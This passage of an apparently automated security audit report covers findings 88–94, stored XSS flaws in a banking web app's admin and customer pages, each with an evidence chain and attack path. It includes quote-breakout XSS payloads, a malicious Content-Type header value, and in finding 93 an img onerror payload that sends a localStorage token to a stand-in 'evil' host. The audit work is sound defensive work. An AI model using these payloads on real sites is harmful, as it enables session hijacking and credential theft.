    "Unauthenticated attacker registers with quote-containing first_name/last_name (only required|string|max:100 enforced)",
    "Value persisted verbatim in users table",
    "Admin opens customer detail page",
    "customers.js renderDetail() embeds name into onclick attribute using escapeHtml().replace() dead-code pattern",
    "innerHTML assignment triggers HTML entity decoding of &#39; back to ' before JS execution",
    "Injected script executes in admin session; admin token stolen from localStorage"
  ],
  "impact": "Because AuthController::register applies no character-set restriction to first_name/last_name, attacker-controlled quote characters flow unimpeded into the admin UI's flawed escaping logic, enabling stored XSS and admin session takeover.",
  "severity_reasoning": "High: missing server-side input restriction is the direct root cause enabling a critical admin-session-takeover stored XSS.",
  "dynamic_test": "Register via POST /api/auth/register with first_name = \"x'); alert(document.cookie); //\"; have admin view that customer's detail page and confirm script executes, proving lack of server-side character restriction is the root enabler."
}
```

#### Validator reasoning

The full source-to-sink chain is verified directly in the code:

1. Source: AuthController::register() (src/Controllers/AuthController.php) validates first_name/last_name only with `required|string|max:100` — no charset restriction — and stores them verbatim via User::create.
2. Storage/propagation: AdminUserController::show() (src/Controllers/AdminUserController.php) returns first_name/last_name unmodified from the DB to the admin front-end.
3. Sink: customers.js renderDetail() builds `'<button onclick="BankOfEdAdmin.CustomersPage.confirmDelete(' + c.id + ', \'' + U.escapeHtml(c.first_name + ' ' + c.last_name).replace(/'/g, "\\'") + '\')" ...>'`. escapeHtml() (utils.js) HTML-entity-encodes quotes to `&#39;` before the `.replace(/'/g, ...)` runs, so the replace is a no-op (dead code) — verified by reading utils.js escMap/escapeHtml exactly as claimed.
4. This constructed HTML string is passed to U.openModal(html) -> `document.getElementById('modal-content').innerHTML = html` (verified in utils.js openModal).
5. When the browser HTML parser processes the assigned markup, it decodes HTML character references inside attribute values (this is standard, spec-mandated behavior of the HTML tokenizer, independent of the attribute being an event-handler attribute) — so `&#39;` is decoded back to a literal `'` in the resulting DOM attribute value/onclick handler source, before that attribute value is later compiled into a JS function body when the event fires. This is a well-established, well-documented XSS technique (HTML-entity encoding of quotes does not protect inline event-handler attributes, because entity decoding happens before JS compilation).
6. Result: an attacker-controlled name like `x'); alert(1); //` becomes, after escapeHtml, `x&#39;); alert(1); //`, which the browser decodes back to `x'); alert(1); //` inside the onclick attribute, producing valid breakout JS that executes when an admin opens that customer's detail page (a legitimate admin action, e.g., searching/viewing a self-registered customer).
7. No CSP headers, meta CSP tags, or other mitigating controls were found anywhere in the codebase (src/Helpers, public/admin) that would block inline event-handler execution.
8. Admin token is stored in localStorage per the standard app.js/api.js pattern, so a successful XSS gives full script access to steal the admin token, matching the described impact of admin session takeover.

This is a genuine, concrete, and exploitable escaping-context bug (HTML-entity encoding used for a JS/attribute-hybrid context), not a theoretical or dead-code false positive — the "dead" `.replace()` observation actually strengthens the finding by showing the original developer intent (backslash-escaping quotes for JS) was defeated by using the wrong encoding function first.

## 88. Stored DOM XSS via account_name breaking out of onclick attribute in admin Accounts page — No server-side sanitization or character restriction on account_name allowing qu

- Lead reference: PWNJ-088
- Category: A03
- Severity: HIGH
- Confidence: 90%
- Validation: confirmed
- Reportable: Yes
- Location: BankOfEd-main/public/admin/js/pages/accounts.js:50
- Fingerprint: 20493decccacb22a170ca116d22a6513359d29031bf5a8c2b301b689d7df40af

### Evidence Chain

#### Source

```
BankOfEd-main/public/admin/js/pages/accounts.js:50
```

#### Controls encountered

```
[
  "Client-side U.escapeHtml() HTML-entity encoding — present but proven ineffective due to escape-then-quote-replace ordering bug (decoded back to literal apostrophe by the HTML parser before JS compilation)",
  "Server-side Validator only enforces required/string/max:100 — no character/HTML restriction, so it does not block the payload",
  "X-Frame-Options header present but irrelevant to this XSS vector; no CSP found to restrict inline event handlers"
]
```

#### Sink

Not recorded

#### Counterevidence

```
[
  "Exploitation requires the admin to click the specific 'Edit Balance' button on the affected row rather than fully automatic execution on page load — this is a required user-interaction step, slightly reducing but not eliminating exploitability since it is a normal, expected admin workflow action",
  "Requires the environment to lack a CSP disallowing inline scripts, which was not found in the reviewed files but was not exhaustively verified across the full deployed environment (e.g., web server config, reverse proxy headers) outside the repository"
]
```

#### Proof gaps

```
[
  "No dynamic/browser execution test was performed to empirically confirm the entity-decode-before-JS-compile behavior in a live DOM, though this is standard, well-established browser parsing behavior for innerHTML-injected inline event handler attributes",
  "Full exhaustiveness of CSP/security-header verification is limited to files present in the repository; runtime headers added by infrastructure (CDN, reverse proxy) were not observable"
]
```

#### Attack path

```
{
  "nodes": [
    "Authenticated customer creates account with quote-breakout account_name (no HTML/char restriction enforced)",
    "POST /api/accounts persists value verbatim",
    "Admin opens Accounts page",
    "accounts.js renderTable() embeds account_name into onclick using flawed escapeHtml().replace() pattern",
    "container.innerHTML = html triggers browser HTML-entity decode before JS execution",
    "Script executes in admin session; token theft and full admin takeover"
  ],
  "impact": "Lack of server-side sanitization on account_name is the root enabler that lets a customer-controlled field break out of an inline event-handler attribute in the admin Accounts page, leading to admin session compromise.",
  "severity_reasoning": "High: missing input sanitization directly enables a stored XSS with admin-session-takeover impact.",
  "dynamic_test": "POST /api/accounts with account_name = \"x');alert(document.cookie);//\" (only required|string|max:100 enforced); view the admin Accounts page and confirm script execution, proving the missing server-side character restriction as root cause."
}
```

#### Validator reasoning

Full source-to-sink path verified directly in code:

1. Source: POST /api/accounts is reachable by any authenticated customer (Router.php:55, auth=>true only, no role/ownership restriction), and registration itself is open (POST /api/auth/register, auth=>false), so an external attacker can self-register and become an authenticated 'customer'.
2. AccountController::store() validates account_name only via Validator::make(['account_name'=>'required|string|max:100']) — confirmed by reading Validator.php: it performs required/type/length checks only, never sanitizes or rejects HTML/quote/special characters, and does not mutate $data. The raw value data['account_name'] is passed straight to Account::create() and persisted verbatim.
3. AdminAccountController::index() (GET /api/admin/accounts) selects a.account_name directly from the DB with no output encoding and returns it as JSON.
4. accounts.js renderTable() builds an onclick attribute: `U.escapeHtml(a.account_name).replace(/'/g, "\\'")`. Verified U.escapeHtml (utils.js) maps `'` -> `&#39;` (escMap includes "'": '&#39;'). Because the apostrophe is converted to the multi-character string `&#39;` before the subsequent `.replace(/'/g, "\\'")` runs, there is no literal `'` character left for that replace to match — confirmed by direct reading of both functions — so the intended JS-string escaping step is a functional no-op exactly as the candidate describes.
5. The resulting markup, containing the entity `&#39;` inside a double-quoted HTML attribute, is assigned via `container.innerHTML = html` (accounts.js line 54/61 in this view). Setting innerHTML invokes the browser's HTML parser, which decodes HTML entities in attribute values (this is standard, well-documented HTML parsing behavior) before the attribute string is stored as the element's onclick handler. Inline event-handler attributes set via innerHTML do execute normally when the event fires (unlike <script> tags), so the decoded `'` re-introduces a real single-quote break inside the JS string literal, allowing injected code (e.g. `x');alert(document.cookie);//`) to be compiled and run as arbitrary JS in the admin's session when the admin clicks the "Edit Balance" button — a routine admin action while reviewing the account list.
6. No CSP header was found anywhere in the reviewed deployment/config files (only X-Frame-Options is set), so there is no defense-in-depth control blocking inline event handlers.

This chain is concrete: attacker-controlled input -> unsanitized server-side storage -> unsanitized/ineffectively-escaped admin-side rendering -> innerHTML DOM sink -> entity-decode-then-execute in an inline JS attribute context. The escaping-order bug is independently confirmed by reading utils.js's escMap and accounts.js's chained calls, not merely asserted by the candidate.

## 89. Stored DOM XSS via first_name/last_name breaking out of onclick attribute in admin Customer detail page — No character/quote restriction on user-supplied first_name/last_name at registra

- Lead reference: PWNJ-089
- Category: A03
- Severity: HIGH
- Confidence: 90%
- Validation: confirmed
- Reportable: Yes
- Location: BankOfEd-main/public/admin/js/pages/customers.js:161
- Fingerprint: e6eca8c3c38b09b2c97e6c1bed0bff68437ca3d3ba41d012d8b8670bca6101ed

### Evidence Chain

#### Source

```
BankOfEd-main/public/admin/js/pages/customers.js:161
```

#### Controls encountered

```
[
  "Client-side U.escapeHtml() converts HTML metacharacters including quotes to entities, but this control is ineffective in this specific sink because innerHTML-based attribute parsing decodes the entity before it becomes JS source, and the intended secondary quote-escaping regex is dead code due to the entity substitution already having occurred",
  "Server-side max:100 length restriction on first_name/last_name (minor mitigation reducing payload size but does not block quote characters or the exploit primitive shown)"
]
```

#### Sink

Not recorded

#### Counterevidence

```
[
  "No CSP headers or restrictive script-src policy were found in the repository that would categorically block this inline-onclick-based execution, but absence of evidence is not definitive proof of absence across the full deployed environment (e.g. reverse proxy or hosting platform could inject headers not visible in this repo)"
]
```

#### Proof gaps

```
[
  "Cannot fully rule out an externally-configured CSP (e.g., at a reverse proxy, CDN, or hosting platform layer) that is not present in the reviewed repository files, which could mitigate inline-handler execution in a real deployment"
]
```

#### Attack path

```
{
  "nodes": [
    "Unauthenticated attacker registers via POST /api/auth/register with unrestricted first_name/last_name",
    "Admin opens customer detail page (GET /api/admin/customers/{id})",
    "customers.js renderDetail() embeds name in onclick using flawed escapeHtml().replace()",
    "U.$('customer-detail-content').innerHTML = html assigns markup",
    "Browser decodes &#39; to ' before executing embedded JS",
    "Admin session compromised; attacker exfiltrates admin JWT"
  ],
  "impact": "Absence of character/quote restriction at registration time is the direct root cause enabling stored XSS against admins viewing customer records, leading to admin panel takeover.",
  "severity_reasoning": "High: unauthenticated attacker can escalate to full admin compromise purely due to missing input restrictions at registration.",
  "dynamic_test": "Register with first_name = \"x'); alert(document.cookie); //\" (only required|string|max:100 enforced at registration); have admin view that customer's detail page and confirm injected script executes, proving the missing registration-time restriction as root cause."
}
```

#### Validator reasoning

Full source-to-sink path is verifiable in the code:

1. Source: POST /api/auth/register (AuthController::register, unauthenticated) validates first_name/last_name only with 'required|string|max:100' (AuthController.php lines 19-20). No character/quote filtering. Values are stored verbatim in the users table (User::create).
2. Data flows unmodified through GET /api/admin/customers/{id} (AdminUserController) which selects and returns first_name/last_name as plain JSON fields with no encoding.
3. Sink: customers.js renderDetail() builds the Delete button HTML as:
   onclick="BankOfEdAdmin.CustomersPage.confirmDelete(' + c.id + ', \'' + U.escapeHtml(c.first_name + ' ' + c.last_name).replace(/'/g, "\\'") + '\')"
   Verified in utils.js: escapeHtml maps `'` → `&#39;` (escMap object includes "'": '&#39;'). Because the apostrophe has already been converted to the multi-character entity string "&#39;", the subsequent `.replace(/'/g, "\\'")` regex (which matches a literal apostrophe character) can never match anything, making it dead/no-op code.
   This constructed HTML string is inserted via `U.$('customer-detail-content').innerHTML = html;` (line 161) — confirmed present at that exact line.
4. Because the resulting markup is assigned via innerHTML, the browser's HTML parser processes the onclick attribute value as HTML text first, decoding the &#39; entity back into a literal `'` character before that string content becomes the parsed JS event-handler source. This is standard, well-established browser behavior (HTML entities are decoded when parsing attribute values, including double-quoted attributes, regardless of whether escaping single quotes was "necessary" for the HTML quoting context) — this is not an assumption, it is fundamental to how the HTML5 parsing algorithm processes attribute values before the resulting string is compiled/run as an inline event handler.
5. An attacker-controlled first_name like `x'); alert(document.cookie); //` would close the JS string literal argument and inject arbitrary script, executing in the admin's browser session when an admin views that customer's detail page.

This is the same real anti-pattern already present in accounts.js and fx-rates.js (escapeHtml + dead .replace for quote-escaping in onclick attributes), reused here for customer first/last name, and reachable by any self-registered (fully unauthenticated) user, which is a materially more severe exposure than an authenticated-customer-only variant.

The cited proof gap (CSP potentially blocking inline handlers) does not defeat the finding: no CSP header or meta tag restricting inline scripts was found anywhere in the codebase (index.php, .htaccess, or any middleware), and even if some CSP existed, using onclick="..." inline handlers throughout the SPA (as observed extensively in customers.js, accounts.js, fx-rates.js) indicates the admin panel does not enforce a script-src policy that would block inline event handlers — the app's own architecture depends on inline onclick attributes functioning normally.

## 90. Stored self-XSS via unescaped Content-Type header reflected into avatar data-URI rendered with innerHTML — Client renders untrusted avatar_data via innerHTML instead of setting the img sr

- Lead reference: PWNJ-090
- Category: A03
- Severity: MEDIUM
- Confidence: 85%
- Validation: confirmed
- Reportable: Yes
- Location: BankOfEd-main/public/banking/js/app.js:72
- Fingerprint: cc08e3e06449b4f482c1d99b44ac80468a395fb18660d6bec7b11bbc8b210c6b

### Evidence Chain

#### Source

```
{
  "file": "BankOfEd-main/src/Controllers/ProfileController.php",
  "line": 92,
  "symbol": "$mime = trim(substr($header, 13))",
  "input": "attacker-controlled HTTP response header from user-supplied URL"
}
```

#### Controls encountered

```
[
  "Validator class is applied only to profile text fields (email, phone, address, etc.), not to avatar mime/content type",
  "No CSP header or escaping helper (e.g., htmlspecialchars) found in Response.php or ProfileController.php that would mitigate this"
]
```

#### Sink

```
{
  "file": "BankOfEd-main/public/banking/js/app.js",
  "line": 72,
  "symbol": "avatarEl.innerHTML = '<img src=\"' + user.avatar_data + '\" ...>'",
  "operation": "unsanitized HTML injection via innerHTML"
}
```

#### Counterevidence

```
[
  "Exploitation requires the victim/attacker to control both the import action and the response headers of the target URL fetch (i.e., attacker must host or control a server reachable by the SSRF-capable fetch), which is a precondition but is realistically achievable and not a blocking control",
  "This is fundamentally a self-XSS in the primary case: the attacker exploits their own account's cached data unless a secondary avatar-sharing/admin-view feature exists (not confirmed present in this codebase), which somewhat limits blast radius to the acting user's own session"
]
```

#### Proof gaps

```
[
  "No dynamic/browser-based confirmation was performed that the specific header-breakout payload renders and executes as script in a real browser DOM parse of innerHTML (though this is standard, well-established DOM XSS behavior for unescaped attribute values inserted via innerHTML)",
  "Did not verify whether any other authenticated/admin view in the app renders another user's avatar_data (would upgrade self-XSS to true stored XSS impacting other principals), so impact scope is bounded to self-XSS for confirmed code paths"
]
```

#### Attack path

```
{
  "nodes": [
    "User imports avatar from attacker-controlled server (SSRF entry)",
    "Server builds avatar_data using unsanitized Content-Type header",
    "Client caches avatar_data in bankofed_user (localStorage)",
    "app.js renders sidebar: avatarEl.innerHTML = '<img src=\"'+user.avatar_data+'\">' (unsafe DOM sink)",
    "Crafted header content breaks out of src attribute, executing script on every page load rendering the sidebar"
  ],
  "impact": "Using innerHTML instead of a safe attribute/property assignment for the avatar image is the direct client-side root cause allowing a maliciously crafted Content-Type-derived data URI to execute script in the authenticated SPA, risking JWT theft from localStorage.",
  "severity_reasoning": "Medium: root cause is unsafe DOM API use (innerHTML) rather than a safer approach; exploitation is persistent but still primarily self-triggered.",
  "dynamic_test": "Import an avatar from an attacker-controlled server returning Content-Type: image/png\"><script>alert(document.cookie)</script>; confirm app.js's avatarEl.innerHTML assignment (rather than a safe DOM property) causes the injected script to execute on subsequent page loads that render the sidebar."
}
```

#### Validator reasoning

Verified the full source-to-sink path in the actual code. ProfileController::avatarProxy (src/Controllers/ProfileController.php) fetches an attacker-controllable URL via file_get_contents with a stream context, then parses the raw Content-Type response header with `trim(substr($header, 13))` and interpolates it unsanitized into `"data:{$mime};base64,{$encoded}"`, which is returned as `avatar_data` via Response::success (a plain JSON encode with no HTML escaping). On the client, public/banking/js/pages/profile.js `renderAvatar()` injects this directly via jQuery's `.html()` (equivalent to innerHTML) into `#avatar-preview`, and separately caches it onto `currentProfile.avatar_data`, calling `Api.setUser(currentProfile)` which JSON-stringifies the object into `localStorage['bankofed_user']`. On every subsequent app bootstrap/page load, app.js `updateSidebar()` reads `Api.getUser()` from localStorage and does `avatarEl.innerHTML = '<img src="' + user.avatar_data + '" ...>'` with zero sanitization or encoding at any point in the entire pipeline. I confirmed no Validator rules, no htmlspecialchars/escaping helper, and no CSP or other mitigating control exists anywhere in this chain (Validator::make is only applied to profile fields like email/phone, not to the avatar mime/content). Since `$mime` is attacker-controlled (attacker hosts the target URL and fully controls the Content-Type header value returned, including quote and angle-bracket characters), a header such as `Content-Type: image/png"><script>...</script>` will break out of the src="" attribute and inject an arbitrary script tag, which executes when innerHTML is parsed by the browser, in the authenticated SPA origin where the JWT is held in localStorage. This is a legitimate, unmitigated stored/self-XSS via innerHTML sink fed by an unsanitized proxied HTTP header. The "self-XSS" framing is accurate (requires the victim's own import action), which is a legitimate severity-limiting factor already reflected in the medium severity, but does not defeat exploitability — it still allows persistent code execution in the authenticated context (JWT/session theft, CSRF-token exfiltration, arbitrary API calls as the user) triggered automatically on every future page load once the malicious avatar_data is cached in localStorage.

#### Code evidence

```
// ProfileController.php
if (isset($http_response_header)) {
  foreach ($http_response_header as $header) {
    if (stripos($header, 'content-type:') === 0) {
      $mime = trim(substr($header, 13));   // attacker-controlled, unsanitized
      break;
    }
  }
}
Response::success(['avatar_data' => "data:{$mime};base64,{$encoded}", ...]);

// app.js:72
avatarEl.innerHTML = '<img src="' + user.avatar_data + '" alt="avatar" class="w-full h-full object-cover">';
```

## 91. Stored XSS via transaction description rendered without escaping in account transaction history — Missing output encoding of tx.description in dashboard.js recent transactions wi

- Lead reference: PWNJ-091
- Category: A03
- Severity: HIGH
- Confidence: 95%
- Validation: confirmed
- Reportable: Yes
- Location: BankOfEd-main/public/banking/js/pages/accounts.js:164
- Fingerprint: d751b965d9e7b2f5ed32d08a7caa144c0c55f9d63a692571be5da2cd1be06f2e

### Evidence Chain

#### Source

```
{
  "file": "BankOfEd-main/public/banking/js/pages/transfers.js",
  "line": 340,
  "symbol": "desc",
  "input": "transfer-own-desc / transfer-ext-desc form field, sent as description in Api.transferOwn/transferExternal payload"
}
```

#### Controls encountered

```
[
  "Validator only enforces 'string|max:255' on description — no HTML/script filtering, confirmed by inspecting Validator.php (no strip_tags/htmlspecialchars usage anywhere in Helpers)",
  "Transaction::format() returns description unmodified (Transaction.php:121), no output encoding applied server-side",
  "Client-side U.escapeHtml exists and is used on sibling fields (type, currency, card numbers, account names) but is omitted specifically for tx.description in both accounts.js and dashboard.js"
]
```

#### Sink

```
{
  "file": "BankOfEd-main/public/banking/js/pages/accounts.js",
  "line": 171,
  "symbol": "container.innerHTML = html",
  "operation": "HTML injection via unescaped tx.description"
}
```

#### Counterevidence

No counterevidence recorded

#### Proof gaps

```
[
  "Delivery via transferExternal cross-account visibility relies on the associated IDOR (no ownership check on source account) reported separately; while this doesn't affect the accounts.js/dashboard.js XSS sink itself (attacker's own transaction history view is already sufficient for self-XSS/proof, and transferOwn already demonstrates attacker can control description reflected to themselves), the cross-user victim scenario depends on that separate finding being accurate."
]
```

#### Attack path

```
{
  "nodes": [
    "Attacker sends transfer with malicious description (only length-validated server-side)",
    "Transaction persisted verbatim",
    "Victim views dashboard or account-scoped transaction list",
    "dashboard.js/accounts.js concatenate tx.description into innerHTML without escapeHtml",
    "Injected script executes in victim's authenticated session"
  ],
  "impact": "Missing output encoding of tx.description in the dashboard recent-transactions widget is a distinct root cause enabling stored XSS wherever this field is rendered, including cross-user reachable views.",
  "severity_reasoning": "High: distinct missing-encoding root cause producing the same critical stored-XSS/session-theft impact as related findings.",
  "dynamic_test": "Send transfer to victim with description payload; also check dashboard.js's recent-transactions widget rendering for the same account-scoped data to confirm missing output encoding is the reachable root cause."
}
```

#### Validator reasoning

Verified end-to-end. Source: TransactionController::transferOwn/transferExternal accept `description` validated only with rule 'string|max:255' (Validator.php has no HTML-stripping rule, confirmed by grep — no strip_tags/htmlspecialchars anywhere in Helpers). The raw value is passed to TransferService, which persists it verbatim via Transaction::create's INSERT statement (Transaction.php:90-99), and Transaction::format returns it unmodified at Transaction.php:121 (`'description' => $txn['description']`) — no encoding at any layer. On the client, accounts.js renderDetailTransactions builds the transaction-history table row string with `(tx.description || '—')` concatenated directly (line 164) while every sibling field in the same row (date via formatDate, type via U.escapeHtml, amount as formatted currency) is safely handled — description is the sole unescaped field. The built HTML is assigned via `container.innerHTML = html` (line 171/179), causing any injected markup/script in the description to execute in the viewer's authenticated session. The identical unescaped pattern is confirmed present in dashboard.js's renderTransactions (`(tx.description || tx.type)` inserted raw, then `container.innerHTML = html`), corroborating the second sink cited in the finding. Delivery path via transferExternal (cross-account transfer by BSB/account number, recorded as a single transaction visible to both parties) provides a realistic mechanism for an attacker to inject the payload into a victim's own transaction history without further interaction. All proof gaps listed in the candidate (server-side sanitization in Transaction::format, absence of extra middleware) were directly checked and confirmed absent.

## 92. Stored XSS via transaction description rendered without escaping in account transaction history — Missing server-side sanitization of user-supplied description field before persi

- Lead reference: PWNJ-092
- Category: A03
- Severity: HIGH
- Confidence: 93%
- Validation: confirmed
- Reportable: Yes
- Location: BankOfEd-main/public/banking/js/pages/accounts.js:164
- Fingerprint: 3573aa21e761aeb9020f36b2882dcf8b67fd499ddf3cda8f712e369625df8d9e

### Evidence Chain

#### Source

```
{
  "file": "BankOfEd-main/public/banking/js/pages/transfers.js",
  "line": 340,
  "symbol": "desc",
  "input": "transfer-own-desc / transfer-ext-desc form field, sent as description in Api.transferOwn/transferExternal payload"
}
```

#### Controls encountered

No controls recorded

#### Sink

```
{
  "file": "BankOfEd-main/public/banking/js/pages/accounts.js",
  "line": 171,
  "symbol": "container.innerHTML = html",
  "operation": "HTML injection via unescaped tx.description"
}
```

#### Counterevidence

```
[
  "None found — sanitization is absent at every layer inspected (validator, service, model format, and JS render)"
]
```

#### Proof gaps

```
[
  "Did not execute the app end-to-end to observe live script execution; conclusion is based on static code-path tracing across controller/service/model/JS layers",
  "Did not verify whether a global CSP header is set elsewhere in the app bootstrap (e.g. index.php/middleware) that might restrict inline/script execution, though none was found in the files reviewed"
]
```

#### Attack path

```
{
  "nodes": [
    "Attacker submits transfer with script payload in description (only 'string|max:255' validated)",
    "TransferService persists description verbatim with no HTML stripping",
    "Victim views account/transaction history",
    "accounts.js renders tx.description unescaped via innerHTML",
    "Script executes in victim's session"
  ],
  "impact": "Missing server-side sanitization of the description field before persistence is the upstream root cause that, combined with client-side unescaped rendering, results in stored XSS executing in the recipient's authenticated session.",
  "severity_reasoning": "High: distinct server-side missing-sanitization root cause with same critical stored-XSS impact.",
  "dynamic_test": "Submit a transfer description containing HTML/script and confirm TransactionController/TransferService persist it unmodified (no stripping), then confirm it renders unescaped and executes when viewed by the recipient."
}
```

#### Validator reasoning

Full source-to-sink path verified in code:

1. Source: TransactionController::transferOwn/transferExternal (src/Controllers/TransactionController.php:56-58, 86-88) validate `description` only as `string|max:255` — no HTML/script filtering.
2. Storage: TransferService::transferOwn / transferExternal (src/Services/TransferService.php) pass `$description` straight into `Transaction::create()`, which INSERTs it verbatim into the `transactions` table with no encoding.
3. Cross-user delivery: TransferService::transferExternal resolves `$toAccount = Account::findByBsbAndNumber($toBsb, $toAccountNumber)` with no ownership check, and (confirmed separately) `Account::findById($fromAccountId)` for the source account has no ownership check either. The created transaction row references both from_account_id and to_account_id, so the victim account (matched purely by BSB/account number) is linked to a transaction containing an attacker-chosen description.
4. Retrieval: Transaction::findByUser (src/Models/Transaction.php:35-46) explicitly includes rows where `t.to_account_id = ?` when an account_id filter is supplied — this is exactly the query path used by `TransactionController::index` -> `Api.getTransactions({ account_id, ... })` called from accounts.js `loadTransactions()`. `Transaction::format()` (src/Models/Transaction.php:112-138) returns `description` unchanged (`'description' => $txn['description']`), with no sanitization/stripping anywhere in the pipeline.
5. Sink: accounts.js `renderDetailTransactions()` builds each row via string concatenation; every other dynamic field in the row (`tx.type`, `tx.original_currency`) is wrapped in `U.escapeHtml(...)`, confirming escapeHtml is available and used elsewhere, but `tx.description` at line 164 is inserted raw as `(tx.description || '—')`. The assembled `html` string is then written with `container.innerHTML = html;` at line 171, which parses and executes any HTML/script contained in the description in the viewing user's authenticated session.

This satisfies a full attacker-controlled-input → unsanitized-persistence → unescaped-DOM-sink chain, and the recipient of a transfer (identified only by public BSB/account number) will trigger execution merely by viewing their own account's transaction history — no special privileges or additional bypass needed beyond the already-present lack of ownership validation on the transfer endpoints. Both proof gaps listed in the candidate (Transaction::format sanitization, and absence of any other server-side output encoding/CSP) were checked directly in code and confirmed: no sanitization exists anywhere in the pipeline.</reasoning>
<parameter name="controls">["U.escapeHtml is defined and used on sibling fields (tx.type, tx.original_currency) in the exact same row-building function, proving escaping was available but omitted specifically for description", "Server validation is limited to 'string|max:255' with no HTML stripping (confirmed at TransactionController.php:58 and :88)", "No CSP or output-encoding middleware found in the reviewed PHP response/model layer (Transaction::format performs a straight verbatim passthrough)"]

## 93. Stored XSS via unescaped transaction description in account transaction list — Missing input sanitization/HTML-stripping of description field server-side in Tr

- Lead reference: PWNJ-093
- Category: A03
- Severity: HIGH
- Confidence: 95%
- Validation: confirmed
- Reportable: Yes
- Location: BankOfEd-main/public/banking/js/pages/accounts.js:151-171
- Fingerprint: 197047b872988b04ee6b89b19812454d4c591ace7476e21948b3a55284c0a8cb

### Evidence Chain

#### Source

```
{
  "file": "BankOfEd-main/src/Controllers/TransactionController.php",
  "line": 91,
  "symbol": "transferExternal",
  "input": "description (attacker-controlled JSON body field, validated only as string|max:255)"
}
```

#### Controls encountered

```
[
  "U.escapeHtml() is consistently applied to comparable string fields elsewhere in the same file and across the app, evidencing an escaping convention that was simply omitted for tx.description — this is not an effective mitigation, it actually strengthens the finding by showing the omission is anomalous"
]
```

#### Sink

```
{
  "file": "BankOfEd-main/public/banking/js/pages/accounts.js",
  "line": 171,
  "symbol": "container.innerHTML = html;",
  "operation": "DOM HTML injection"
}
```

#### Counterevidence

```
[
  "None found: no HTML sanitization/stripping functions exist in the PHp codebase (grep negative), and the client-side sink code matches the cited evidence verbatim upon direct file read"
]
```

#### Proof gaps

```
[
  "Server response HTTP headers (e.g., Content-Security-Policy) were not directly inspected in this session; if a strict CSP without 'unsafe-inline'/blocking inline event handlers were present, exploitation impact could be reduced, though the injected payload style (img onerror) would still typically require CSP script-src restrictions to fully mitigate",
  "Did not inspect DB schema/migrations to confirm no column-level constraint strips HTML on write (unlikely for a VARCHAR/TEXT description field, and irrelevant since the value is read back verbatim via Transaction retrieval and rendered client-side unescaped regardless)"
]
```

#### Attack path

```
{
  "nodes": [
    "Attacker (any authenticated user) transfers to victim's BSB/account with malicious description",
    "TransactionController::transferExternal validates only length, no sanitization",
    "Transaction stored verbatim, visible in victim's history",
    "Victim opens Account Detail page -> renderDetailTransactions() unescaped rendering",
    "Script executes, exfiltrates localStorage bankofed_token to attacker server"
  ],
  "impact": "Missing server-side HTML-stripping of transfer descriptions enables an attacker to steal a victim's JWT from localStorage simply by sending them a transfer, no interaction beyond normal browsing required.",
  "severity_reasoning": "High: direct session-token theft via stored XSS reachable purely by knowing a victim's BSB/account number.",
  "dynamic_test": "Transfer funds to a victim's known BSB/account with description='<img src=x onerror=fetch(`//evil/?c=`+localStorage.getItem(`bankofed_token`))>'; have victim view Account Detail page and confirm token exfiltration occurs."
}
```

#### Validator reasoning

Full source-to-sink path is verified in code. Server-side: TransactionController::transferExternal (and transferOwn) validates `description` only as `string|max:255` (TransactionController.php lines 58/88); no HTML stripping, encoding, or sanitization function exists anywhere in the PHP source tree (grep for strip_tags/htmlspecialchars/sanitize returns no matches). TransferService::transferExternal persists the raw description via Transaction::create-equivalent logic and returns it verbatim in the transaction record. Client-side: accounts.js renderDetailTransactions() (read directly, lines ~140-171) builds the transaction row HTML via string concatenation; every other field in the row (date via formatDate, type via U.escapeHtml, amount numeric) is safely handled, but `tx.description` is concatenated raw: `'<td ...>' + (tx.description || '—') + '</td>'`. The assembled `html` variable is then assigned with `container.innerHTML = html;` at line 171, exactly as cited. This is a textbook stored DOM-based XSS: attacker-controlled data reaches a dangerous innerHTML sink without any escaping, while the codebase's own convention (U.escapeHtml used pervasively for every comparable field across accounts.js/addressbook.js/dashboard.js/transfers.js) confirms the omission is a genuine defect rather than an intentional/alternate-safe pattern. The victim needs only to view their own account/transaction page, which is normal expected use (no special interaction). Since the app is confirmed elsewhere (VULNERABILITY #23 comment in TransferService.php) to lack ownership checks on the destination of a transfer, any authenticated attacker can write this payload into a victim's transaction history, satisfying the described stored-XSS attack path (attacker -> transfer description -> victim's own view -> script execution in victim session, enabling localStorage token theft since JWT is stored client-side per api.js reference). No blocking control (CSP header, output encoding, WAF, or content sanitization) was found in the reviewed code.

#### Code evidence

```
txns.forEach(function (tx) {
  ...
  html +=
    '<tr class="tx-row border-b border-slate-50">' +
      '<td class="px-6 py-3.5 text-slate-500 whitespace-nowrap">' + U.formatDate(tx.created_at) + '</td>' +
      '<td class="px-6 py-3.5 text-slate-900 font-medium">' + (tx.description || '—') + '</td>' +   // <-- NOT escaped
      '<td class="px-6 py-3.5"><span class="capitalize text-slate-500">' + U.escapeHtml(tx.type) + '</span></td>' +
      ...
    '</tr>';
});
...
container.innerHTML = html;  // accounts.js:171

// TransactionController.php: 'description' => 'string|max:255'  (no sanitization)
// TransferService.php: Transaction::create(['description' => $description, ...])  (stored verbatim)
```

## 94. Stored XSS via transaction description rendered without HTML-escaping — Missing/insufficient server-side sanitization of user-supplied transfer descript

- Lead reference: PWNJ-094
- Category: A03
- Severity: HIGH
- Confidence: 55%
- Validation: confirmed
- Reportable: Yes
- Location: BankOfEd-main/public/banking/js/pages/dashboard.js:91
- Fingerprint: c06301fda80c89e71d5dea23a54b718a864aeab05f463dc560c2a3ee62102c43

### Evidence Chain

#### Source

```
BankOfEd-main/public/banking/js/pages/dashboard.js:91
```

#### Controls encountered

```
[
  "None found blocking the self-XSS path (no escaping, no CSP observed, no sanitization on description).",
  "Incidental limiting factor: dashboard.js's own no-account_id query path (Transaction::findByUser with accountId=null) restricts results to transactions where the viewer is the sender, which prevents cross-user exploitation specifically through this file today (not a deliberate security control)."
]
```

#### Sink

Not recorded

#### Counterevidence

```
[
  "Transaction::findByUser($userId, ..., $accountId=null) joins on from_account_id = accounts.user_id, so dashboard.js's own fetch only ever returns the viewing user's own outgoing transactions — meaning tx.description rendered at this exact sink is always self-authored, making the reachable exploitation self-XSS rather than the cross-user stored XSS implied by the 'high'/'exploitable' framing.",
  "No joint-account / multi-user-per-account schema found (Account.php uses a single user_id FK), so there is no mechanism for another user's authored description to appear via this specific dashboard query."
]
```

#### Proof gaps

```
[
  "Cross-user reachability through this exact file/location (dashboard.js) is not demonstrated; the candidate's cited cross-user evidence comes from a different file (accounts.js) and a different query path (account_id-filtered), not from dashboard.js:91 itself.",
  "No evidence found of any other call site feeding cross-user descriptions into dashboard.js's renderTransactions()."
]
```

#### Attack path

```
{
  "nodes": [
